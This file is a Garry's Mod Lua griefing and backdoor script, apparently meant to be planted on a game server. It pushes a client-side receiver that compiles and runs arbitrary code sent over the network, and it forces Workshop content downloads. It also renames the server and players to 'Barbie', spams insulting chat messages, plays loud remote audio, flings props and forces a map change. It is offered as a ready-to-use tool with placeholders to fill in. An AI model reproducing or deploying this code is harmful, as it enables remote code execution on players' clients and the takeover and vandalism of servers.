function RandomString(intMin, intMax)
    local ret = &quot;&quot;
        for _ = 1, math.random(intMin, intMax) do
        ret = ret .. string.char(math.random(65, 90))
    end
        return ret
    end
    local randomtable = {
        CodeRandom = RandomString(0, 69),
        TimingRandom = RandomString(0, 69),
        ClientRandom = RandomString(0, 69),
        ServeurRadom = RandomString(0, 69)
        }
    util.AddNetworkString(randomtable[&quot;TimingRandom&quot;])
    util.AddNetworkString(randomtable[&quot;CodeRandom&quot;])
    BroadcastLua([[net.Receive(&quot;]] .. randomtable[&quot;CodeRandom&quot;] .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
    hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;MacdoFritesKetchup&quot;, function(ply)
        if not ply:IsBot() then
            ply:SendLua([[net.Receive(&quot;]] .. randomtable[&quot;CodeRandom&quot;] .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
            ply:SendLua([[steamworks.DownloadUGC(YOUR_WORKSHOP_ID, function(n) game.MountGMA(n) game.AddParticles(&quot;particles/CHANGE_ME.pcf&quot;) PrecacheParticleSystem(&quot;CHANGE_ME&quot;) end)]])
        end
        for k, v in pairs(player.GetAll()) do
            v:SendLua(&amp;quot;steamworks.DownloadUGC( 2173234246, function( name )game.MountGMA( name )end)&amp;quot;)
        end 
    end)
    m_strImageGlobalVar = RandomString( 6, 12 )
    local function InfoClient(code)
    local data = util.Compress(code)
    local len = #data
        net.Start(randomtable[&quot;CodeRandom&quot;])
        net.WriteUInt(len, 16)
        net.WriteData(data, len)
        net.Broadcast()
    end
    timer.Simple(2.5, function()
        RunConsoleCommand(&quot;hostname&quot;, &quot;❤Barbie City❤&quot;)
        RunConsoleCommand(&quot;ulx&quot;, &quot;god&quot;, &quot;*&quot;)
        RunConsoleCommand(&quot;sv_alltalk&quot;, &quot;1&quot;)
        PrecacheParticleSystem(&quot;CHANGE_ME&quot;)
    end)
    timer.Simple(5, function()
    InfoClient([[net.Receive(&quot;]] .. randomtable[&quot;TimingRandom&quot;] .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
    InfoClient([[
        for i = 1, 10 do
        ParticleEffectAttach(&quot;CHANGE_ME&quot;, PATTACH_ABSORIGIN_FOLLOW, LocalPlayer(), 0)
    end
    timer.Simple(5, function()
    timer.Create(&quot;]] .. RandomString(0, 69) .. [[&quot;, 0.3, 0, function()
        notification.AddLegacy( &quot;Barbie is here !&quot;, math.random(0, 4), 1.5 )
    end)
    timer.Create(&quot;]] .. RandomString(0, 69) .. [[&quot;, 0.3, 0, function()
        notification.AddLegacy( &quot;Barbie BITCH &quot;, math.random(0, 4), 1.5 )
    end)
    timer.Create(&quot;]] .. RandomString(0, 69) .. [[&quot;, 0.3, 0, function()
            notification.AddLegacy( &quot;Barbie GANG&quot;, math.random(0, 4), 1.5 )
        end)
    end)
    timer.Simple(1, function()
        function GAMEMODE:PostDraw2DSkyBox()
    local col = Color( 255, 0, 217)
        render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
        return !!1
    end
        function GAMEMODE:PreDrawSkyBox()
    local col = Color( 255, 0, 225)
        render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
            return !!1
        end
    end)
    ]])
    timer.Simple( 5, function()
    InfoClient([=[
    g_]=].. m_strImageGlobalVar.. [=[ = {}
    local html = [[&lt;style type=&quot;text/css&quot;&gt; html, body {background-color: transparent;} html{overflow:hidden; ]].. (true and &quot;margin: -8px -8px;&quot; or &quot;margin: 0px 0px;&quot;) ..[[ } &lt;/style&gt;&lt;body&gt;&lt;img src=&quot;]] .. &quot;%s&quot; .. [[&quot; alt=&quot;&quot; width=&quot;]] .. &quot;%i&quot;..[[&quot; height=&quot;]] .. &quot;%i&quot; .. [[&quot; /&gt;&lt;/body&gt;]]
    local function LoadWebMaterial( strURL, strUID, intSizeX, intSizeY )
    local pnl = vgui.Create( &quot;HTML&quot; )
        pnl:SetPos( ScrW() -1, ScrH() -1 )
        pnl:SetVisible( true )
        pnl:SetMouseInputEnabled( false )
        pnl:SetKeyBoardInputEnabled( false )
        pnl:SetSize( intSizeX, intSizeY )
        pnl:SetHTML( html:format(strURL, intSizeX, intSizeY) )
    local PageLoaded
    PageLoaded = function()
    local mat = pnl:GetHTMLMaterial()
        if mat then
    g_]=].. m_strImageGlobalVar.. [=[[strUID] = { mat, pnl }
        return
    end
    timer.Simple( 0.5, PageLoaded )
    end
    PageLoaded()
    end
    ]=])
    end)
    
    InfoClient([[
    local sW, sH = ScrW(), ScrH()
    local w,h = ScrW(), ScrH()
    local W, H = ScrW(), ScrH()
    local prevVal = 2
    local defaultfov = LocalPlayer():GetFOV()
    local override = 70
    local sent = false
    local audio
    local skys = ents.FindByClass(&quot;env_skypaint&quot;)
    local function AudioVizualier()
        if not audio then return end
    local tbl = {}
    local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
    local vv = Vector(col.r / 255, col.g / 255, col.b / 255)
        audio:FFT(tbl, FFT_4096)
    local avg = 0
        for i = 1, 40 do
        avg = avg + tbl[i]
    end
    local h = CurTime() * 250 % 360
        prevVal = Lerp(30 * FrameTime(), prevVal, avg)
            if prevVal &gt; 2 then
        util.ScreenShake(vector_origin, prevVal * 2, 10, 2, 5000)
    local vPos = LocalPlayer():EyePos()
    local emitter = ParticleEmitter( LocalPlayer():EyePos())
    local particle = emitter:Add( &quot;sprites/glow04_noz&quot;, vPos )
        if ( particle ) then
        particle:SetVelocity(VectorRand() * 50)
        particle:SetDieTime(1)
        particle:SetStartAlpha(0)
        particle:SetEndAlpha(255)
        particle:SetStartSize(50)
        particle:SetEndSize(0)
        particle:SetStartLength(55)
        particle:SetEndLength(0)
        particle:SetColor(vv)
        particle:SetGravity(Vector(0,0,0))
        particle:SetAirResistance(5)
        particle:SetCollide(true)
        particle:SetBounce(0.9)
    end
        override = Lerp(10 * FrameTime(), override, prevVal * .875)
        else
        override = Lerp(5 * FrameTime(), override, defaultfov)
        sent = false
    end
    local vPos = LocalPlayer():EyePos() + Vector(0, 0, -5)
    local emitter = ParticleEmitter( LocalPlayer():EyePos())
    local particle = emitter:Add(&quot;particle/particle_smokegrenade&quot;, vPos)
        particle:SetVelocity(VectorRand() * 50)
        particle:SetDieTime(2)
        particle:SetStartAlpha(math.Rand(1,10))
        particle:SetStartSize(1900)
        particle:SetEndSize(math.Rand(80,90))
        particle:SetColor(vv)
        particle:SetGravity(Vector(0,0,100))
        particle:SetAirResistance(500)
    end
    local Wmats = Entity(0):GetMaterials()
        for k,v in pairs(Wmats) do
        Material(v):SetVector(&quot;$color&quot;, Vector(0,0,0))
    end 
    local col = HSVToColor(CurTime() * 36 % 360, .3, .8)
    local v = Vector(col.r / 255, col.g / 255, col.b / 255)
        for k, v in pairs( ents.FindByClass( &quot;prop_*&quot; ) ) do 
        v:SetColor( col )
        v:Activate()
    end
        for k,p in pairs(player.GetAll()) do
        p:SetColor( col )
        end
        local chair = ClientsideModel(&quot;models/diamond/diamond.mdl&quot;)
        chair:SetNoDraw(true)
        local data = {}
        
        local function genChair(id)
            local pos = LocalPlayer():GetPos()
            data[id] = { Vector(math.random(pos.x - 1000, pos.x + 1000), math.random(pos.y - 1000, pos.y + 1000), pos.z + math.random(800, 1000)), math.random(100, 700) }
        end
        
        for i = 1, 70 do
            genChair(i)
        end
        
        hook.Add(&quot;PostDrawOpaqueRenderables&quot;, &quot;RandomString(0, 69)&quot;, function()
            local z = LocalPlayer():GetPos().z
            for i = 1, #data do
                chair:SetPos(data[i][1])
                chair:SetupBones()
                
                -- Appliquer une &eacute;chelle 10 fois plus grande
                local scale = Vector(1, 1, 1)
                chair:SetModelScale(scale.x)
                
                -- Faire tourner le mod&egrave;le de 360 degr&eacute;s
                local angle = Angle(0, CurTime() * 50, 0) -- Vous pouvez ajuster la vitesse de rotation en changeant la valeur de CurTime() * X
                chair:ManipulateBoneAngles(0, angle)
                
                chair:DrawModel()
                data[i][1].z = data[i][1].z - data[i][2] / 20
                if data[i][1].z &lt;= z then
                    genChair(i)
                end
            end
        end)
        
        local CHANGE_MEMusique = {}
        
        hook.Add(&quot;HUDPaint&quot;, &quot;MesOreilleSaleConnard&quot;, function()
            for k, v in pairs(CHANGE_MEMusique) do
                v()
            end
        end)
        
        
    SOUNDSTART_CTP = false
    OZJFOZJCEZIO = true
    
    sound.PlayURL(&quot;https://dl.sndup.net/kxdn/Nicki%20Minaj%20X%20I.mp3&quot;, &quot;noblock&quot;, function(s)
        if not IsValid(s) then return end
        audio = s
        s:EnableLooping( false)
        if not s then return end
        if SOUNDSTART_CTP then s:Stop() return end
    SOUNDSTART_CTP = true
        s:SetVolume(25)
        s:Play()
    local ragtbl = {}
        CHANGE_MEMusique[&quot;CoolEffect&quot;] = function()
    local tbl = {}
        s:FFT(tbl,FFT_2048)
        xpcall(function()
    local fal = 0
        for i=4,6 do
        fal = fal + tbl[i]
    end
        if fal &gt; 0.7 then
    local oneid = &quot;newhud&quot;..math.random(100, 300)..&quot;id&quot;
    local Wmats = Entity(0):GetMaterials()
        for k,v in pairs(Wmats) do
        Material(v):SetVector(&quot;$color&quot;, Vector(255,255,255))
    end                         
    util.ScreenShake( Vector( 0, 0, 0 ), 50, 50, 2, 5000 ) 
        for _, v in ipairs(player.GetAll()) do
            v:SetWeaponColor(Vector(255, 255, 255))
        end
                    
                    
    timer.Simple(0.2, function()
    local Wmats = Entity(0):GetMaterials()
        for k,v in pairs(Wmats) do
        Material(v):SetVector(&quot;$color&quot;, Vector(255, 0, 225))
    end                     
        for _, v in ipairs(player.GetAll()) do
            v:SetWeaponColor(Vector(255, 0, 225))
        end   
        end)
    end
        end,function()
    end)
        end
    end)
        surface.SetDrawColor( 255, 255, 255, 255)
        surface.DrawTexturedRectRotated( (ScrW() /2), (ScrH() /2), 120, 120, math.sin( CurTime() *10) )
    hook.Add(&quot;HUDPaint&quot;, &quot;]] .. randomtable[&quot;ClientRandom&quot;] .. [[&quot;, AudioVizualier)
    hook.Add(&quot;CalcView&quot;, &quot;]] .. randomtable[&quot;ClientRandom&quot;] .. [[&quot;, function(ply, origin, angles, fov, znear, zfar)
        return {
        [&quot;origin&quot;] = origin,
        [&quot;angles&quot;] = angles,
        [&quot;fov&quot;] = override,
        [&quot;znear&quot;] = znear,
        [&quot;zfar&quot;] = zfar
        }
    end)
    local function stop()
        audio = nil
        hook.Remove(&quot;HUDPaint&quot;, &quot;]] .. randomtable[&quot;ClientRandom&quot;] .. [[&quot;)
        hook.Remove(&quot;HUDShouldDraw&quot;, &quot;]] .. randomtable[&quot;ClientRandom&quot;] .. [[&quot;)
        hook.Remove(&quot;CalcView&quot;, &quot;]] .. randomtable[&quot;ClientRandom&quot;] .. [[&quot;) 
        for k, v in pairs(oldhooks) do
        hook.Add(&quot;HUDPaint&quot;, k, v)
            oldhooks[k] = nil
        end
    end
    concommand.Add(&quot;lelstop&quot;, stop)
        if s == 1 then 
    timer.Create(&quot;]] .. RandomString(0, 69) .. [[&quot;, 0.2, 0, function()
            util.ScreenShake( Vector(0,0,0), 2.5, 50, 0.5, 5000 )
        end)
    end
    ]])
    end)
    -- Spam Chat
    timer.Simple(5, function()
    InfoClient([[  
    timer.Create(&quot;]] .. randomtable[&quot;ServeurRadom&quot;] .. [[&quot;, 1.7, 0, function()
    local time = tonumber(0)
    local Message = {
        &quot;&lt; ❤Barbie❤ &gt;&quot;,
        &quot;&lt;&lt; ❤Barbie❤ &gt;&gt;&quot;,
        &quot;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&gt;&quot;,
        &quot;&lt;&lt;&lt; ❤Barbie❤ &gt;&gt;&gt;&quot;,
        &quot;&lt;&lt; ❤Barbie❤  &gt;&gt;&quot;,
        }
        for _, line in pairs(Message) do
        time = time + tonumber(0.1)
    timer.Simple(time,function()
            chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
            end)
        end
    end)
    ]])
    end)
    timer.Simple( 5, function()
        RunConsoleCommand(&quot;sv_gravity&quot;, &quot;200&quot;)
    end)
    
    timer.Create(&quot;LoadGM&quot;, 235, 1, function()
        RunConsoleCommand(&quot;ulx&quot;, &quot;map&quot;, &quot;gm_construct&quot;)
    end)
    
    timer.Create(&quot;Prop&quot;, 5, 0, function()
        for k, v in pairs(ents.FindByClass(&quot;prop_*&quot;)) do
    local phys = v:GetPhysicsObject()
        if (IsValid(phys)) then
        phys:EnableMotion(true)
        end
    end
    local props = ents.GetAll()
        for _, prop in ipairs(props) do
            if (prop:GetPhysicsObject():IsValid()) then
                prop:GetPhysicsObject():ApplyForceCenter(Vector(0, 0, (650 * 0.73) * prop:GetPhysicsObject():GetMass()))
            end
        end
    end)
    
    timer.Create(&quot;RPName&quot;, 5, 99, function()
        for _, v in pairs(player.GetAll()) do
            v:GodEnable()
            v:setDarkRPVar(&quot;rpname&quot;, &quot;❤Barbie❤&quot;)
        end
    end)
    
    timer.Simple(5, function()
        for k, v in pairs(player.GetAll()) do
            v:SetRunSpeed(400 * 4)
            v:SetWalkSpeed(400 * 4)
        end
    end)
    
    timer.Create(RandomString(0, 69), 5.5, 1, function()
        for k, v in pairs(ents.FindByClass(&quot;prop_*&quot;)) do
    local phys = v:GetPhysicsObject()
        if (IsValid(phys)) then
            phys:EnableMotion(true)
        end
    end
    local props = ents.GetAll()
        for _, prop in ipairs(props) do
            if (prop:GetPhysicsObject():IsValid()) then
                prop:GetPhysicsObject():ApplyForceCenter(Vector(0, 0, (650 * 0.73) * prop:GetPhysicsObject():GetMass()))
            end
        end
    end)
     function RunHASHOb() end